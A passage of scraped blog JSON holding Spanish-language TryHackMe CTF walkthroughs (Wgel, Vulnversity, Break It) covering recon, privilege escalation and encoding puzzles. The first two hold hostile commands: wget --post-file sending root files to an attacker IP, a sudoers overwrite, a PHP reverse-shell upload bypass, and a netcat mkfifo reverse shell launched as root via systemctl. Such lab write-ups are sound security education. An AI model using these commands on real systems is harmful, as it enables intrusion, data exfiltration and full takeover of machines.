2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.86 seconds   HTTP En el puerto 80 esta corriendo apache.\nAnalizamos el codigo fuente del index de apache y econtramos un comentario que no es comun en el index de apache.\nGOBUSTER - HTTP Escaneo de directorios y archivos con gobuster.\n1 2 3 4 5  root@aoiri:~/tryhackme/wgel_ctf# gobuster dir -u http://10.10.116.173/ -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt -q /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 403) /sitemap (Status: 301)   Pagina web en /sitemap/ Nuevamente hacemos un escaneo con gobuster pero ahora a la pagina que encontramos (/sitemap/).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  root@aoiri:~/tryhackme/wgel_ctf# gobuster dir -u http://10.10.116.173/sitemap/ -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt -q /.ssh (Status: 301) /about.html (Status: 200) /blog.html (Status: 200) /contact.html (Status: 200) /css (Status: 301) /fonts (Status: 301) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /js (Status: 301) /services.html (Status: 200) /shop.html (Status: 200) /work.html (Status: 200) root@aoiri:~/tryhackme/wgel_ctf#   Encontramos un directorio (/.ssh) donde se encuentra una clave privada de ssh.\nSSH - Jessie Iniciamos session con Jessie y la clave privada que encontramos anteriormente, obtenemos una shell ssh y nuestra primera flag user_flag.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y encomtramos que podemos correr el comando wget.\nPara obtener nuestra segunda flag utilizamos wget con el parametro --post-file con la ruta del archivo y hacia la IP donde queremos enviar el archivo. Ponemos a la escucha netcat (local) en el puerto 80.\nComando:\n1  sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.8.1.72   Netcat con la flag root_flag.txt.\nROOT SHELL Para obtener una shell con privilegios de administracion primero obtenemos el archivo /etc/sudoers mediante la misma forma que con la flag, editamos el archivo sudoers localmente agregando nuestra propia configuracion para el usuario Jessio.\nCambiamos esta linea por la segunda en el archivo:\n1 2  #jessie ALL=(root) NOPASSWD: /usr/bin/wget jessie ALL=(ALL) NOPASSWD: ALL   Una vez hecho esto levantamos un servidor con python3 en la ruta donde se encuentra nuestro archivo sudoers.\nY en la maquina wgel ejecutamos el comando wget con sudo el cual va a sobreescribir el archivo /etc/sudoers.\nNos ubicamos en la carpeta /etc/ y ejecutamos:\n1  sudo /usr/bin/wget 10.8.1.72/sudoers --output-document=sudoers   Verificamos con el comando sudo -l -l que la configuracion haya cambiado.\nEjecutamos el comando sudo su y obtenemos una shell con privilegios root.\n","description":"","id":64,"section":"posts","tags":["linux"],"title":"TryHackMe - Wgel CTF","uri":"https://sckull.github.io/posts/wgel/"},{"content":"Vulnversity es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Vulnversity     Info Learn about active recon, web app attacks and privilege escalation.   Puntos 3685   Dificultad Facil   Maker tryhackme    { Reconnaissance } Comenzamos desde esta tarea, la primera es desplegar nuestra maquina. En esta tarea utilizamos nmap una herramienta para realizar un escaneo de hosts, puertos, servicios y ejecutar scripts en una red.\n   nmap flag Descripcion     -sv Determina la version del servicio   -p  or -p- Escanea el puerto x o escanea todos los puertos   -Pn Solo escanea puertos abiertos y no hosts   -A Determina la version del SO y ejecuta scripts   -sC Escanea con scripts por default   -v Verbosidad   -sU Puertos UDP   -sS Puertos TCP    Info From Vulnersity room.\nNMAP Comenzamos escaneando todos los puertos tcp y servicios disponibles en el host y guardar el reporte en un archivo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  # Nmap 7.80 scan initiated Wed Dec 25 15:31:22 2019 as: nmap -sS -T4 -sV -p- -o nmap_scan 10.10.193.246 Nmap scan report for 10.10.193.246 Host is up (0.17s latency). Not shown: 65529 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 3128/tcp open http-proxy Squid http proxy 3.5.12 3333/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Dec 25 15:45:34 2019 -- 1 IP address (1 host up) scanned in 851.97 seconds   { Locating directories using GoBuster } Utilizamos GoBuster para escanear directorios y archivos en la pagina web que esta corriendo en el puerto 3333.\n   GoBuster flag Descripcion     -e Imprime la URL completa   -u La url Objetivo   -w Direccion del wordlist   -U y -P usuario y constraseña para autenticacion   -p  Proxy para las peticiones   -c Especifica el cookie para autenticacion    Info From Vulnersity room.\nGOBUSTER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  root@aoiri:~# gobuster dir -u http://10.10.193.246:3333 -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.193.246:3333 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2019/12/25 15:56:20 Starting gobuster =============================================================== /css (Status: 301) /fonts (Status: 301) /images (Status: 301) /index.html (Status: 200) /internal (Status: 301) /js (Status: 301) /server-status (Status: 403) =============================================================== 2019/12/25 15:58:19 Finished ===============================================================   Realizamos un escaneo al directorio /internal/.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  root@aoiri:~/tryhackme/www# gobuster dir -u http://10.10.193.246:3333/internal/ -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.193.246:3333/internal/ [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2019/12/25 16:15:40 Starting gobuster =============================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /css (Status: 301) /index.php (Status: 200) /uploads (Status: 301) =============================================================== 2019/12/25 16:17:19 Finished ===============================================================   { Compromise the webserver } El directorio /internal nos muestra una pagina donde podemos subir archivos.\nAl intentar subir un archivo con extension .php, .txt, .jpg nos muestra un mensaje de error.\nBURPSUITE Utilizamos burpsuite para poder capturar la solicitud que hacemos al enviar el archivo, cambiando la extension y enviarla nuevamente con diferentes extenciones las cuales puedan ser interpretadas por php.\nOWASP - Unrestricted File Upload\nUtilizamos una shell inversa que nos trae Kali Linux (/usr/share/webshells/php/php-reverse-shell.php) cambiamos la ip y el hacia donde va la shell. Intentamos subir este archivo y capturamos la solicitud con burpsuite.\nEnviamos la solicitud a Intruder, agregamos un marcador de payload a la extension del archivo para poder hacer la misma solicitud pero con diferente extension.\nEn la pestaña de payloads agregamos las extensiones que vamos a utilizar.\n1 2 3 4 5  .php4 .php5 .pht .phtml .ini   Comenzamos el \u0026lsquo;Ataque\u0026rsquo;, al finalizar vemos que una de las solicitudes fue exitosa con la extension .phtml.\nRevisamos la pagina de /internal/uploads/ y vemos que nuestro archivo esta ahora en el servidor.\nVisitamos nuestro archivo para que se ejecute y obtenemos una shell.\n{ Privilege Escalation } Ahora que tenemos una shell en la maquina podemos buscar una manera para poder obtener permisos root, comenzamos enumerando los archivos SUID con find.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  $ find / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah -rwsr-xr-x 1 root root 31K Jul 12 2016 /bin/fusermount -rwsr-xr-x 1 root root 40K May 16 2018 /bin/mount -rwsr-xr-x 1 root root 139K Jan 28 2017 /bin/ntfs-3g -rwsr-xr-x 1 root root 44K May 7 2014 /bin/ping -rwsr-xr-x 1 root root 44K May 7 2014 /bin/ping6 -rwsr-xr-x 1 root root 40K May 16 2017 /bin/su -rwsr-xr-x 1 root root 645K Feb 13 2019 /bin/systemctl -rwsr-xr-x 1 root root 27K May 16 2018 /bin/umount -rwsr-xr-x 1 root root 35K Mar 6 2017 /sbin/mount.cifs -rwsr-sr-x 1 daemon daemon 51K Jan 14 2016 /usr/bin/at -rwsr-xr-x 1 root root 49K May 16 2017 /usr/bin/chfn -rwsr-xr-x 1 root root 40K May 16 2017 /usr/bin/chsh -rwsr-xr-x 1 root root 74K May 16 2017 /usr/bin/gpasswd -rwsr-xr-x 1 root root 33K May 16 2017 /usr/bin/newgidmap -rwsr-xr-x 1 root root 39K May 16 2017 /usr/bin/newgrp -rwsr-xr-x 1 root root 33K May 16 2017 /usr/bin/newuidmap -rwsr-xr-x 1 root root 53K May 16 2017 /usr/bin/passwd -rwsr-xr-x 1 root root 23K Jan 15 2019 /usr/bin/pkexec -rwsr-xr-x 1 root root 134K Jul 4 2017 /usr/bin/sudo -rwsr-xr-- 1 root messagebus 42K Jan 12 2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 10K Mar 27 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 419K Jan 31 2019 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 15K Jan 15 2019 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-sr-x 1 root root 97K Jan 29 2019 /usr/lib/snapd/snap-confine -rwsr-xr-x 1 root root 75K Jul 17 11:22 /usr/lib/squid/pinger -rwsr-xr-x 1 root root 39K Jun 14 2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic   Podemos observar que entre los binarios se encuentra systemctl, por lo cual vamos a utilizarlo para obtener privilegios root, con los siguientes comandos.\nGTFOBINS - Systemctl\nPrimero creamos un archivo el cual va ejecutar una shell inversa:\n1  echo \u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.8.1.72 1337 \u0026gt;/tmp/f\u0026#34; \u0026gt; /tmp/shell.sh   Creamos un servicio y lo ejecutamos con systemctl.\n1 2 3 4 5 6 7 8 9 10  TF=$(mktemp).service echo \u0026#39;[Service] Type=oneshot ExecStart=/bin/sh -c \u0026#34;bash /tmp/shell.sh\u0026#34; [Install] WantedBy=multi-user.target\u0026#39; \u0026gt; $TF /bin/systemctl link $TF /bin/systemctl enable --now $TF   Obtenemos una shell con el usuario root.\n","description":"","id":65,"section":"posts","tags":["linux"],"title":"TryHackMe - Vulnversity","uri":"https://sckull.github.io/posts/vulnversity/"},{"content":"Break It es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Break It     Room Break It   Info Can you break the code?   Puntos 2539   Dificultad Media   Maker Deskel    Break It nos trae una serie de retos que vienen en tres fases, la primera codificacion en las distintas bases existentes, la segunda fase una serie de retos relacionado a codificacion y encriptacion en cipher, la tercera face pero no la mas facil una serie de retos de codificacion, encriptacion en cipher y bit shift.\nCodificacion en Base    Base Ejemplo: \u0026ldquo;breakit\u0026rdquo;     Base2 01100010 01110010 01100101 01100001 01101011 01101001 01110100   Base8 142 162 145 141 153 151 164   Base16 62 72 65 61 6b 69 74   Base32 MJZGKYLLNF2A====   Base58 4jP4KDubX1   Base62 22udqyscMu   Base64 YnJlYWtpdA==   Base85 @WH$gCM@k   Base91 %zmfv;:YH    Encriptacion Cipher    Cipher Ejemplo: \u0026ldquo;breakit\u0026rdquo;     Caesar Cipher iylhrpa (shift 7)   Vigenere Cipher uyqtrum (key: thm)    Decodificadores   Hex Workshop\n  CyberChef\n  dcode\n  cryptii\n  Base85.io\n  { Fase 01 - Base } #1 [Super easy] Reto\nMVQXG6K7MJQXGZJTGI====== Solucion\n1 2 3  sckull@uplifted:/media/sckull/Files/tryhackme/BREAKIT$ echo MVQXG6K7MJQXGZJTGI====== | base32 -d easy_base32 sckull@uplifted:/media/sckull/Files/tryhackme/BREAKIT$   #2[Easy] Reto\nTVJYWEtZVE1NVlBXRVlMVE1WWlE9PT09 Solucion\n1 2 3  sckull@uplifted:/media/sckull/Files/tryhackme/BREAKIT$ echo TVJYWEtZVE1NVlBXRVlMVE1WWlE9PT09 | base64 -d| base32 -d double_bases sckull@uplifted:/media/sckull/Files/tryhackme/BREAKIT$   #3[Moderate] Reto\nGM4HOU3VHBAW6OKNJJFW6SS2IZ3VAMTYORFDMUC2G44EQULIJI3WIVRUMNCWI6KGK5XEKZDTN5YU2RT2MR3E45KKI5TXSOJTKZJTC4KRKFDWKZTZOF3TORJTGZTXGNKCOE====== Solucion\nBase32 \u0026gt; Base58 \u0026gt; Base16 \u0026gt; Base64\n[Solucion - CyberChef]\nhttps://gchq.github.io/CyberChef/#recipe=From_Base32('A-Z2-7%3D',true)From_Base58('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',true)From_Hex('Space')From_Base64('A-Za-z0-9%2B/%3D',true)\u0026amp;input=R000SE9VM1ZIQkFXNk9LTkpKRlc2U1MySVozVkFNVFlPUkZETVVDMkc0NEVRVUxJSkkzV0lWUlVNTkNXSTZLR0s1WEVLWkRUTjVZVTJSVDJNUjNFNDVLS0k1VFhTT0pUS1pKVEM0S1JLRkRXS1pUWk9GM1RPUkpUR1pUWEdOS0NPRT09PT09PQ #4[Hard] Reto\nHRBUGQDUHFWDIXKUIBWXIJTHIE3DCY3BIE2FKQSZHNDE6MRUIA2TWWDMHRBV2ZKCHQWFCTLPIE2EEJDBIBZCEW3OHUSTOLRCHNFGMVC6IFJXIQ2AHVMVONSBHVOVIM2MHVPV42J4HQVCQ4REIFHVIJ2WHFWDYQSUHROGILJCIFIU23CXHNCEIXK2HRDVSXKOHV2SQJLC Solucion\nBase85 \u0026gt; Base85 \u0026gt; base32 \u0026gt; base85 \u0026gt; base64 \u0026gt; base58 \u0026gt; base85 \u0026gt; base64 \u0026gt; base64\n[Solucion - CyberChef]\nhttps://gchq.github.io/CyberChef/#recipe=From_Base85('!-u')From_Base32('A-Z2-7%3D',false)From_Base85('!-u')From_Base64('A-Za-z0-9%2B/%3D',true)From_Base58('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',false)From_Base85('!-u')From_Base64('A-Za-z0-9%2B/%3D',true)From_Base64('A-Za-z0-9%2B/%3D',true)\u0026amp;input=ODVfY1M3bztaUzg0SFpLOFFcVmM4Tz9LXDhQMnJROE9ZRic2V2wzMzhPWUMoOTJTVms4NTtRQTJHSShMOE81KzI9JyVkYTg1X2NUMTBSPTw4NVdHWDZXP2BVOE9ZQyc3N29zNzhPP1RKNzk7OUA4NiZTZjpKPVlSODU7V0U5aWFWPjhPYzxTOFBxNi84Ni9HYzpKT2hUODYvTWU4UExzNzg2L1BmMWJxWls4NVdEVDspRDA%2BOE9jNk84UDFhPjg0SFpLPV0mKnQ4NWA1UjhQRGBEOE9jOU8xLEQ6Ijg1O05AOFFcVkA4NV9pVjtjbFtnODYuS0U7K2FNTA #5[Insane] Reto - Pastebin\nPastebin\nSolucion\nBase32 \u0026gt; Base85 \u0026gt; Base10 \u0026gt; Base16 \u0026gt; Base91 \u0026gt; Base58 \u0026gt; Base16 \u0026gt; Base64 \u0026gt; Base10 \u0026gt; Base16\n[Solucion - CyberChef, dcode.fr]\n1- Base32 \u0026gt; Base85 \u0026gt; Base10 \u0026gt; Base16\nhttps://gchq.github.io/CyberChef/#recipe=From_Base32('A-Z2-7%3D',false)From_Base85('!-u')From_Decimal('Space',false)From_Hex('Auto')\u0026amp;input= 2- Base91\naE8aZL9YYk4vQt1Zd7yaxV77wCZNkkD9DhEiAnujqBWRzyYphzsb6PVBZtCNPg9K4Sxctp2dvV76p1Qho73sLDqXvhFkNYQ4ovG5GdcWrR1wqTUCsNXBQTkpxE16j9KKqbGoSvajW4pZds8Rm2cLvuAwHxBw9BLafyUYP6NKZ9v8khk3zMvDQGDkdac3EHUy11BDEBDLM3uMNJBvqUKCprznqvBz8WhtstapDVE3CamkyBNRY4d7i92jgp4mefw8ntHEcin4kUH8CXZJHLUZGytcbGPNPatrsGPCS5L7mfRrqMPbVY21CTDmQs7qesrELzuhh7bDHqh7nk1SAqFcQj37c55PxejBMf5efP2Ju7kf1YwCu7Ac9VFVUtYQrm32UEkWihj5i2HASAZaAJ1ZWBWLwyUBJav8HH7FwCA3NzqVd5vsmTbGNk3Fb2EqeG5G1Xhn7ZQAH3RfmcnzA98RT4wgqEN7jVHhiJdZa5pgyS8bCNC56tXpn9sfrqpNhoT3mX87heTmn6p5t4BecT85PRgezBmwHgCbU5GPunkisbPtnP1PxmkWgYZ5o2c9MyyQG9osEy8JrSyZQpE5DHyHMWQnKLKAQLawq5uKjZJNQEcpmqHKRDApPfJF4VjQPiVShy9qcuFXEsApUGJ2oFkH5TziVYxsmeZSb5yg1qYJ9jN8XE4T3GBh64Jkt6YUvDFPGJh2moZW5TjSpKt9M5Jdj9qF2twkAUFDSZDNadD2Hm9iT6fBHnaortu4ENchFs91JFNWhP1MomRgYaj9u 3- Base58 \u0026gt; Base16 \u0026gt; Base64 \u0026gt; Base10 \u0026gt; Base16\nhttps://gchq.github.io/CyberChef/#recipe=From_Base58('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',false)From_Hex('Space')From_Base64('A-Za-z0-9%2B/%3D',true)From_Decimal('Space',false)From_Hex('Space')\u0026amp;input=YUU4YVpMOVlZazR2UXQxWmQ3eWF4Vjc3d0NaTmtrRDlEaEVpQW51anFCV1J6eVlwaHpzYjZQVkJadENOUGc5SzRTeGN0cDJkdlY3NnAxUWhvNzNzTERxWHZoRmtOWVE0b3ZHNUdkY1dyUjF3cVRVQ3NOWEJRVGtweEUxNmo5S0txYkdvU3Zhalc0cFpkczhSbTJjTHZ1QXdIeEJ3OUJMYWZ5VVlQNk5LWjl2OGtoazN6TXZEUUdEa2RhYzNFSFV5MTFCREVCRExNM3VNTkpCdnFVS0NwcnpucXZCejhXaHRzdGFwRFZFM0NhbWt5Qk5SWTRkN2k5MmpncDRtZWZ3OG50SEVjaW40a1VIOENYWkpITFVaR3l0Y2JHUE5QYXRyc0dQQ1M1TDdtZlJycU1QYlZZMjFDVERtUXM3cWVzckVMenVoaDdiREhxaDduazFTQXFGY1FqMzdjNTVQeGVqQk1mNWVmUDJKdTdrZjFZd0N1N0FjOVZGVlV0WVFybTMyVUVrV2loajVpMkhBU0FaYUFKMVpXQldMd3lVQkphdjhISDdGd0NBM056cVZkNXZzbVRiR05rM0ZiMkVxZUc1RzFYaG43WlFBSDNSZm1jbnpBOThSVDR3Z3FFTjdqVkhoaUpkWmE1cGd5UzhiQ05DNTZ0WHBuOXNmcnFwTmhvVDNtWDg3aGVUbW42cDV0NEJlY1Q4NVBSZ2V6Qm13SGdDYlU1R1B1bmtpc2JQdG5QMVB4bWtXZ1laNW8yYzlNeXlRRzlvc0V5OEpyU3laUXBFNURIeUhNV1FuS0xLQVFMYXdxNXVLalpKTlFFY3BtcUhLUkRBcFBmSkY0VmpRUGlWU2h5OXFjdUZYRXNBcFVHSjJvRmtINVR6aVZZeHNtZVpTYjV5ZzFxWUo5ak44WEU0VDNHQmg2NEprdDZZVXZERlBHSmgybW9aVzVUalNwS3Q5TTVKZGo5cUYydHdrQVVGRFNaRE5hZEQySG05aVQ2ZkJIbmFvcnR1NEVOY2hGczkxSkZOV2hQMU1vbVJnWWFqOXU { Fase 02 - Base, Cipher } #1[Easy] Reto\nPJXHQ4S7GEZV6ZTDOZQQ==== Solucion\nBase32 \u0026gt; Caesar Cipher (Shift 13) \u0026gt; \u0026quot;make_13_spin\u0026quot;\n1- Base32\nznxr_13_fcva 2- Caesar Cipher (shift 13)\nmake_13_spin #2 [Moderate] Reto\nNjZMKVhATl1EcEI2Jio4Q0xuVy1EZSo5ZkFLV0M6QVUtPFpGQ0InIkReYg== Solucion\nBase64 \u0026gt; Base85 \u0026gt; Vigenere Decode (key: tango)\n[Solucion - CyberChef]\nhttps://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)From_Base85('!-u')Vigen%C3%A8re_Decode('tango')\u0026amp;input=TmpaTUtWaEFUbDFFY0VJMkppbzRRMHh1VnkxRVpTbzVaa0ZMVjBNNlFWVXRQRnBHUTBJbklrUmVZZz09 #3 [Hard] Reto\n-!r/X,]n/Z-Zs\\X,X$,rI\u0026lt;@]#-9Oh,-=A]R-p9\\+ Solucion\nBase85 \u0026gt; Rot47 \u0026gt; Base64 \u0026gt; Base32 \u0026gt; Caesar cipher ( shift 13) \u0026gt; qrpbqr_naq_ebg \n1- Base85 \u0026gt; Rot47 \u0026gt; Base64 \u0026gt; Base32 (CyberChef)\nhttps://gchq.github.io/CyberChef/#recipe=From_Base85('!-u')ROT47(47)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',true)\u0026amp;input=LSFyL1gsXW4vWi1ac1xYLFgkLHJJPEBdIy05T2gsLT1BXVItcDlcKw 2- Caesar Cipher (shift 13)\nqrpbqr_naq_ebg #4 [Insane] Reto - Pastebin\nPastebin\nyou are a real code cracker\nSolucion\nBase32 \u0026gt; Base85 \u0026gt; Base91 \u0026gt; Base10 \u0026gt; Base16 \u0026gt; Base64 \u0026gt; Base58 \u0026gt; Vigenere Cipher \n1- Base32 \u0026gt; Base85 (CyberChef)\nhttps://gchq.github.io/CyberChef/#recipe=From_Base32('A-Z2-7%3D',true)From_Base85('!-u')\u0026amp;input=R1pYU01QS1hINFJHRTRUS0dRU1ZLWVMzSEpFVUNYRE1HSlBEQVhDU0lFMlNHUVNJSUZJV1FSSlpHQlVVR0tKSkZVNFQyNERKSUZJU1FTWlNGWTRWS01LVUdaWFNJMkRMSFJSVFNYTEtHUVNWS1lTM0hVU0c0TEpRR0ZDVzRPQ09JRTJTSVpUQUdRU1NDSkxGR0JVVUdLSkpGVTRUNEozTkZOT1VHTTJCRlk0VktNS1VHWlhTTVBLWEg0UkdFNFRLR1FTVktZUzNITlFWTVhSTUdFVkZHTDJOSUUyU0lJS01JRklXT1FUUkdCVVVHS0pKRlU0VDRKM05JTVhXTVNKR0ZZNFZLTUtVR1pYU01QS1hGVVJUS05KVkdRU1ZLWVMzSE5RVk1YUk1HRlFUSVFLUElFMlNHUVNJSUZJV1FSSlpHQlVVR0tKSkZVNFQyNERKSUZJU1FUUlRGWTRWS01LVUdaWFNNUEtYRlVSVEtOSlZHUVNWS1lTM0hOUVZNWFJNR0ZDVzRPQ09JRTJTR0xLRElGSVdRWTJGR0JVVUdLSkpGVTRUNFhSS0ZOT1VHS1I2Rlk0VktNS1VHUk5DSVgyU0g0UkdFNFRLR1FTVktZUzNIVVNHNExKUUdCU0RRSlNNSUUyU0dRU0lJRklXU1FLUkdCVVVHS0pKRlU0VDRVUkdGTk9VR00yQkZZNFZLTUtVR1pYU0kzQ0tJUVhUVTRKSkdRU1ZLWVMzSUEzU1VSUzZHRlFUSVFLUElFMlNJWlRBSUZJV1FSSlpHQlVVR0tKSkZVNFQ0WFJLRk5PVUdNMkJGWTRWS01LVUdSTkNHTkxHSFJSVFNYTEtHUVNWS1lTM0hVU0c0TEpRR0ZRVElRS1BJRTJTR0xLRElGSVdTVTJaR0JVVUdLSkpGVTRUMjRESklGSVNRU1pTRlk0VktNS1VIUkVTNk5aTkg0UkdFNFRLR1FTVktZUzNIVVNHNExKUUdGUVRJUUtQSUUyU0dMS0RHUkNXQVpSSEdCVVVHS0pKRlU0VDRKM05GTk9VR0tSNkZZNFZLTUtVSFJFUzJZMk9IUlJUU1hMS0dRU1ZLWVMzSEpFVUNYRE1HSlBEQVhDU0lFMlNJSUtNSUZJV09RVFJHQlVVR0tKSkZVNFQ0SjNORk5PVUtYQlNGWTRWS01LVUhSRVMyWTJPSFJSVFNYTEtHUVNWS1lTM0lBM1NVUlM2R0ZDVzRPQ09JRTJTSUlLTUlGSVdRUkpaR0JVVUdLSkpGVTRUMjRESkZOT1VLWEJTRlk0VktNS1VHWlhTSTJETEhSUlRTWExLR1FTVktZUzNJRkhVQzJUQ0dGQ1c0T0NPSUUyU0lJS01HUkNXRVVTWUdCVVVHS0pKRlU0VDI0REpJRklTUVRSVEZZNFZLTUtVR1JOQ0lYMlNJQllXMlgzU0dRU1ZLWVMzSFVTRzRMSlFKQTNFNlpLQUlFMlNJSUtNR1FTU0NKTEZHQlVVR0tKSkZVNFQ0VVJHSU1YV01TSkdGWTRWS01LVUdSTkNHTkxHSFJSVFNYTEtHUVNWS1lTM0hKRVQ2T1JJSTVZRElYQjdJRTJTR1FTSUlGSVdPUVRSR0JVVUdLSkpGVTRUMjRESkZOT1VHS1I2Rlk0VktNS1VIUkVTNk5aTkg0UkdFNFRLR1FTVktZUzNJQTNTU01SMkdJVFU2U1NRSUUyU0lJS01JRklXU1FLUkdCVVVHS0pKRlU0VDI0REpJRklTUVNaU0ZZNFZLTUtVR1pYU01QS1hHUVVVUVhLTkdRU1ZLWVMzSFVTRzRMSlFHRkNXNE9DT0lFMlNJWlRBSUZJV1FSSlpHQlVVR0tKSkZVNFQ0VVJHR1paRlVLTElGWTRWS01LVUdSTkNJWDJTSDRSR0U0VEtHUVNWS1lTM0hKRVQ2T1JJSTVZRElYQjdJRTJTR1FTSUlGSVdTUUtSR0JVVUdLSkpGVTRUNFhSS0ZOT1VHTEo3Rlk0VktNS1VHUk5DSVgyU0lCWVcyWDNTR1FTVktZUzNISkVUNk9SSUk1WURJWEI3SUUyU0laVEFJRklXU1UyWkdCVVVHS0pKRlU0VDRYUktJRklTUVJLUA 2- Base91\n53 50 32 51 49 32 53 53 32 51 48 32 53 49 32 53 55 32 51 49 32 52 56 32 53 50 32 52 54 32 52 54 32 52 70 32 53 54 32 52 56 32 53 53 32 51 49 32 53 54 32 52 55 32 54 56 32 55 53 32 54 50 32 53 53 32 53 50 32 54 56 32 53 65 32 54 66 32 51 53 32 55 56 32 54 49 32 53 56 32 54 52 32 51 48 32 52 70 32 53 56 32 54 67 32 52 53 32 52 69 32 51 49 32 52 54 32 52 51 32 52 69 32 54 65 32 52 53 32 51 51 32 53 49 32 55 65 32 52 65 32 51 49 32 54 52 32 53 51 32 52 49 32 54 70 32 54 49 32 51 50 32 53 54 32 51 53 32 52 70 32 54 57 32 52 50 32 51 48 32 53 57 32 53 55 32 51 53 32 54 69 32 54 50 32 51 50 32 53 50 32 55 54 32 54 52 32 51 50 32 51 52 32 55 48 3- Base10 \u0026gt; Base16 \u0026gt; Base64 \u0026gt; Base58 - (CyberChef)\nhttps://gchq.github.io/CyberChef/#recipe=From_Decimal('Space',false)From_Hex('Space')From_Base64('A-Za-z0-9%2B/%3D',true)\u0026amp;input=NTMgNTAgMzIgNTEgNDkgMzIgNTMgNTMgMzIgNTEgNDggMzIgNTMgNDkgMzIgNTMgNTUgMzIgNTEgNDkgMzIgNTIgNTYgMzIgNTMgNTAgMzIgNTIgNTQgMzIgNTIgNTQgMzIgNTIgNzAgMzIgNTMgNTQgMzIgNTIgNTYgMzIgNTMgNTMgMzIgNTEgNDkgMzIgNTMgNTQgMzIgNTIgNTUgMzIgNTQgNTYgMzIgNTUgNTMgMzIgNTQgNTAgMzIgNTMgNTMgMzIgNTMgNTAgMzIgNTQgNTYgMzIgNTMgNjUgMzIgNTQgNjYgMzIgNTEgNTMgMzIgNTUgNTYgMzIgNTQgNDkgMzIgNTMgNTYgMzIgNTQgNTIgMzIgNTEgNDggMzIgNTIgNzAgMzIgNTMgNTYgMzIgNTQgNjcgMzIgNTIgNTMgMzIgNTIgNjkgMzIgNTEgNDkgMzIgNTIgNTQgMzIgNTIgNTEgMzIgNTIgNjkgMzIgNTQgNjUgMzIgNTIgNTMgMzIgNTEgNTEgMzIgNTMgNDkgMzIgNTUgNjUgMzIgNTIgNjUgMzIgNTEgNDkgMzIgNTQgNTIgMzIgNTMgNTEgMzIgNTIgNDkgMzIgNTQgNzAgMzIgNTQgNDkgMzIgNTEgNTAgMzIgNTMgNTQgMzIgNTEgNTMgMzIgNTIgNzAgMzIgNTQgNTcgMzIgNTIgNTAgMzIgNTEgNDggMzIgNTMgNTcgMzIgNTMgNTUgMzIgNTEgNTMgMzIgNTQgNjkgMzIgNTQgNTAgMzIgNTEgNTAgMzIgNTMgNTAgMzIgNTUgNTQgMzIgNTQgNTIgMzIgNTEgNTAgMzIgNTEgNTIgMzIgNTUgNDg 4- Vigenere Cipher\nroh gfh o nrtl purh qnnvkrx (key: tangodown) { Fase 03 - Base, Cipher, Bit Shift } #1 [Moderate] Reto\n2D 37 2B 19 31 99 31 B3 B2 AB A5 18 32 37 20 B3 B2 AC 2D 1A 31 B4 A1 3A A4 A3 9C B4 AD 36 AC 9E Solucion\nBlock Shift Left (1 vez) \u0026gt; Base64 \u0026gt; ROT13\n1- Bock Shift Left\n2- Base64 \u0026gt; ROT13 